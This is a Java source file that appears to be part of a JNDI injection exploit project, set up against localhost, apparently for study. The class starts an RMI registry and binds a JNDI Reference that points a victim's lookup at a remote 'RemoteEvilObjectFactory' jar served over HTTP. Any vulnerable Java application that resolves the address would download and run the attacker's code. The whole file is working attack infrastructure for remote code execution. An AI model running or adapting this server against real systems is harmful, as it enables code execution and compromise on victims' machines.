package com.venscor.jdni.server;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

/**
 * @author wangyu07 <wangyu07@kuaishou.com>
 * Created on 2022-02-07
 */
public class RMIReferenceServer {

    private static final int RMI_PORT = 53424;

    private static final String REFERENCE_CLASS_NAME = "com.venscor.jdni.ExpObject";


    private static final String FACTORY_CLASS_NAME = "com.venscor.jdni.RemoteEvilObjectFactory";
    private static final String FACTORY_LOCATION = "http://127.0.0.1:8082/jndi-exp/target/jndi-exp-1.0-SNAPSHOT.jar";

    private static final String HOST = "127.0.0.1";

    private static final String RMI_EXP_NAME = "rmi://" + HOST + ":" + RMI_PORT + "/exp";

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(RMI_PORT);
            Reference reference = new Reference(REFERENCE_CLASS_NAME, FACTORY_CLASS_NAME, FACTORY_LOCATION);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            Naming.bind(RMI_EXP_NAME, referenceWrapper);

            System.out.println("RMI服务启动成功，地址是：" + RMI_EXP_NAME);
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }
}
